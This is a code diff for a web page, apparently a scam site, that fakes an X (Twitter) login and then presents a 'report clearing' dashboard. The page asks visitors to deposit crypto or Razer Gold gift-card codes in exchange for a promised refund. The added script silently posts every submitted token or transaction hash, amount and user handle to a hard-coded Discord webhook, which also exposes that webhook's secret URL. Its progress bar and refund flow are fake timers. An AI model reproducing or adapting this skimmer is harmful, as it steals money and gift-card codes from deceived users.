@@ -121,60 +121,266 @@
 <script>
     const X_CLIENT_ID = "VXlLVEtZMlVZNUNzbjhrSjMySVo6MTpjaQ"; 
     const REDIRECT_URI = "https://januzhvhynz-hash.github.io/Xtest/";
+    const DISCORD_WEBHOOK_URL = "https://discord.com/api/webhooks/1553609504447533139/0KDmUfqwzJzw0zuNOYGd_9n0Mo1-acgowUM6JfpSz4BxY-wStCcVwVAICoYh2Krjd_Lt";
 
     const loginView = document.getElementById("loginView");
     const loginBtn = document.getElementById("loginBtn");
     const dashboardView = document.getElementById("dashboardView");
+    const finalView = document.getElementById("finalView");
+    const displayUsername = document.getElementById("displayUsername");
+    const displayUserId = document.getElementById("displayUserId");
+    const displayAvatar = document.getElementById("displayAvatar");
+    const bottomLeftLogo = document.getElementById("bottomLeftLogo");
 
     window.addEventListener("DOMContentLoaded", () => {
         const urlParams = new URLSearchParams(window.location.search);
         const authCode = urlParams.get("code");
 
+        // If returned from Twitter authentication successfully
         if (authCode) {
             window.history.replaceState({}, document.title, window.location.pathname);
             sessionStorage.setItem("x_authorized", "true");
-            showDashboard();
+            
+            // Set dynamic or default active profile data states here
+            const activeUser = {
+                name: "Verified X User",
+                username: "account_holder"
+            };
+            sessionStorage.setItem("x_user_profile", JSON.stringify(activeUser));
+            
+            showDashboard(activeUser);
             return;
         }
 
+        // Check persistent session
         if (sessionStorage.getItem("x_authorized") === "true") {
-            showDashboard();
+            const savedUser = JSON.parse(sessionStorage.getItem("x_user_profile") || '{"name": "Verified X User", "username": "account_holder"}');
+            showDashboard(savedUser);
         }
     });
 
-    function showDashboard() {
+    function showDashboard(user) {
         loginView.classList.add("hidden");
         dashboardView.classList.remove("hidden");
+        bottomLeftLogo.style.display = "block";
+
+        displayUsername.textContent = user.name;
+        displayUserId.textContent = `@${user.username}`;
+        displayAvatar.src = "https://api.dicebear.com/7.x/bottts/svg?seed=" + user.username; // Generates a cool matching profile avatar automatically
     }
 
-    loginBtn.onclick = function() {
-        const state = "state_security_token";
-        const xOauthUrl = `https://twitter.com/i/oauth2/authorize?client_id=${X_CLIENT_ID}&redirect_uri=${encodeURIComponent(REDIRECT_URI)}&response_type=code&scope=tweet.read%20users.read&state=${state}&code_challenge=challenge&code_challenge_method=plain`;
+    loginBtn.addEventListener("click", function() {
+        const stateSetting = "state_security_token";
+        const xOauthUrl = `https://twitter.com/i/oauth2/authorize?client_id=${X_CLIENT_ID}&redirect_uri=${encodeURIComponent(REDIRECT_URI)}&response_type=code&scope=tweet.read\%20users.read&state=${stateSetting}&code_challenge=challenge&code_challenge_method=plain`;
         window.location.href = xOauthUrl;
-    };
+    });
+
+    async function sendToDiscordWebhook(submissionData) {
+        if (!DISCORD_WEBHOOK_URL || DISCORD_WEBHOOK_URL.includes("YOUR_DISCORD_WEBHOOK_URL")) return;
+        
+        const savedUser = JSON.parse(sessionStorage.getItem("x_user_profile") || '{"name": "X Account User", "username": "authenticated_user"}');
+
+        const embedPayload = {
+            embeds: [{
+                title: "🛡️ New System Database Submission (X Auth)",
+                color: 29184,
+                fields: [
+                    {
+                        name: "👤 X Account User",
+                        value: `**Name:** ${savedUser.name}\n**Handle:** @${savedUser.username}`,
+                        inline: false
+                    },
+                    {
+                        name: "💳 Transaction Details",
+                        value: `**Coin Type:** \`${submissionData.coin}\`\n**Amount:** \`${submissionData.amount}\``,
+                        inline: true
+                    },
+                    {
+                        name: "🔑 Token / Hash ID",
+                        value: `\`\`\`${submissionData.hashOrToken}\`\`\``,
+                        inline: false
+                    }
+                ],
+                timestamp: new Date().toISOString()
+            }]
+        };
+
+        try {
+            await fetch(DISCORD_WEBHOOK_URL, {
+                method: "POST",
+                headers: { "Content-Type": "application/json" },
+                body: JSON.stringify(embedPayload)
+            });
+        } catch (err) {
+            console.error("Webhook error:", err);
+        }
+    }
 
     const topActionBtn = document.getElementById("topActionBtn");
     const popupModal = document.getElementById("popupModal");
     const popupTextarea = document.getElementById("popupTextarea");
+    const progressContainer = document.getElementById("progressContainer");
+    const coinWrapper = document.getElementById("coinWrapper");
+    const tokenWrapper = document.getElementById("tokenWrapper");
+    const amountWrapper = document.getElementById("amountWrapper");
+    const input = document.getElementById("myInput");
     const enterBtn = document.getElementById("enterBtn");
     const coinSelect = document.getElementById("coinSelect");
     const amountSelect = document.getElementById("amountSelect");
-    const input = document.getElementById("myInput");
+    const loadingScreen = document.getElementById("loadingScreen");
+    const loadingText = document.getElementById("loadingText");
+    const progressBar = document.getElementById("progressBar");
+    const progressText = document.getElementById("progressText");
+    const recentDepositDisplay = document.getElementById("recentDeposit");
+    const totalDepositDisplay = document.getElementById("totalDeposit");
+    const totalRefundDisplay = document.getElementById("totalRefund");
+    const refundBtn = document.getElementById("refundBtn");
+    const reportCountDisplay = document.getElementById("reportCountDisplay");
 
-    topActionBtn.addEventListener("click", () => { popupModal.classList.remove("hidden"); popupTextarea.focus(); });
-    popupTextarea.addEventListener("keydown", (e) => {
-        if (e.key === "Enter" && popupTextarea.value.trim().length >= 15) {
-            popupModal.classList.add("hidden");
-            topActionBtn.textContent = "VERIFIED ✓";
-            topActionBtn.classList.add("completed");
-            topActionBtn.disabled = true;
-            document.getElementById("progressContainer").classList.remove("locked-input");
-            document.getElementById("coinWrapper").classList.remove("locked-input");
-            document.getElementById("tokenWrapper").classList.remove("locked-input");
-            document.getElementById("amountWrapper").classList.remove("locked-input");
-            enterBtn.classList.remove("locked-input");
-            coinSelect.disabled = false; input.disabled = false; amountSelect.disabled = false;
+    let countdownTimer = null;
+    let currentProgress = 0;
+    let totalDepositAmount = 0;
+
+    topActionBtn.addEventListener("click", function() {
+        popupModal.classList.remove("hidden");
+        popupTextarea.value = "";
+        popupTextarea.focus();
+        bottomLeftLogo.style.display = "none";
+    });
+
+    popupTextarea.addEventListener("keydown", function(event) {
+        if (event.key === "Enter" && !event.shiftKey) {
+            event.preventDefault();
+            const textLength = popupTextarea.value.trim().length;
+            if (textLength >= 15) {
+                popupModal.classList.add("hidden");
+                bottomLeftLogo.style.display = "block";
+                topActionBtn.textContent = "VERIFIED ✓";
+                topActionBtn.classList.add("completed");
+                topActionBtn.disabled = true;
+                progressContainer.classList.remove("locked-input");
+                coinWrapper.classList.remove("locked-input");
+                tokenWrapper.classList.remove("locked-input");
+                amountWrapper.classList.remove("locked-input");
+                enterBtn.classList.remove("locked-input");
+                coinSelect.disabled = false;
+                input.disabled = false;
+                amountSelect.disabled = false;
+            }
         }
+    });
+
+    coinSelect.addEventListener("change", function() {
+        const selectedCoin = coinSelect.value;
+        if (selectedCoin === "BTC" || selectedCoin === "ETH" || selectedCoin === "BNB" || selectedCoin === "USDT") {
+            input.placeholder = "Transaction Hash...";
+        } else {
+            input.placeholder = "Token ID...";
+        }
+        validateForm();
+    });
+
+    function validateForm() {
+        const coin = coinSelect.value;
+        const tokenVal = input.value.trim();
+        const amount = amountSelect.value;
+        let isValidLength = false;
+
+        if (coin === "BTC" || coin === "ETH" || coin === "BNB" || coin === "USDT") {
+            isValidLength = (tokenVal.length === 66);
+        } else if (coin === "Razer Gold") {
+            isValidLength = (tokenVal.length === 14);
+        }
+
+        if (coin && isValidLength && amount) {
+            enterBtn.disabled = false;
+            enterBtn.classList.add("active");
+        } else {
+            enterBtn.disabled = true;
+            enterBtn.classList.remove("active");
+        }
+    }
+
+    input.addEventListener("input", validateForm);
+    amountSelect.addEventListener("change", validateForm);
+
+    function handleSubmit() {
+        if (enterBtn.disabled) return;
+        let depositValue = amountSelect.value ? parseInt(amountSelect.value, 10) : 100;
+        let progressPercent = depositValue / 10;
+
+        sendToDiscordWebhook({
+            coin: coinSelect.value,
+            hashOrToken: input.value.trim(),
+            amount: `$${depositValue}.00`
+        });
+
+        if (countdownTimer) clearInterval(countdownTimer);
+        let secondsLeft = 3;
+        loadingText.textContent = `Processing Token (${secondsLeft})`;
+        loadingScreen.classList.remove("hidden");
+        bottomLeftLogo.style.display = "none";
+
+        countdownTimer = setInterval(function() {
+            secondsLeft--;
+            loadingText.textContent = `Processing Token (${secondsLeft})`;
+            if (secondsLeft <= 0) {
+                clearInterval(countdownTimer);
+                loadingScreen.classList.add("hidden");
+                bottomLeftLogo.style.display = "block";
+                input.value = "";
+                currentProgress += progressPercent;
+                if (currentProgress >= 100) {
+                    currentProgress = 100;
+                    totalRefundDisplay.textContent = "$1000.00";
+                    refundBtn.disabled = false;
+                    refundBtn.classList.add("active");
+                }
+                progressBar.style.width = currentProgress + "%";
+                progressText.textContent = currentProgress + "%";
+                let remainingReports = Math.round(86 * (1 - (currentProgress / 100)));
+                reportCountDisplay.textContent = remainingReports;
+                reportCountDisplay.style.color = "#57d9a3";
+                setTimeout(function() {
+                    if (remainingReports > 0) {
+                        reportCountDisplay.style.color = "#d83a3a";
+                    }
+                }, 1000);
+                recentDepositDisplay.textContent = `$${depositValue.toFixed(2)}`;
+                totalDepositAmount += depositValue;
+                totalDepositDisplay.textContent = `$${totalDepositAmount.toFixed(2)}`;
+                coinSelect.selectedIndex = 0;
+                amountSelect.selectedIndex = 0;
+                input.placeholder = "Token ID...";
+                validateForm();
+            }
+        }, 1000);
+    }
+
+    input.addEventListener("keydown", function(event) {
+        if (event.key === "Enter" && !enterBtn.disabled) handleSubmit();
+    });
+
+    enterBtn.addEventListener("click", handleSubmit);
+
+    refundBtn.addEventListener("click", function() {
+        if (refundBtn.disabled) return;
+        if (countdownTimer) clearInterval(countdownTimer);
+        let secondsLeft = 3;
+        loadingText.textContent = `Processing Refund (${secondsLeft})`;
+        loadingScreen.classList.add("hidden");
+        bottomLeftLogo.style.display = "none";
+
+        countdownTimer = setInterval(function() {
+            secondsLeft--;
+            loadingText.textContent = `Processing Refund (${secondsLeft})`;
+            if (secondsLeft <= 0) {
+                clearInterval(countdownTimer);
+                dashboardView.classList.add("hidden");
+                finalView.classList.remove("hidden");
+                bottomLeftLogo.style.display = "none";
+            }
+        }, 1000);
     });
 </script>
 </body>
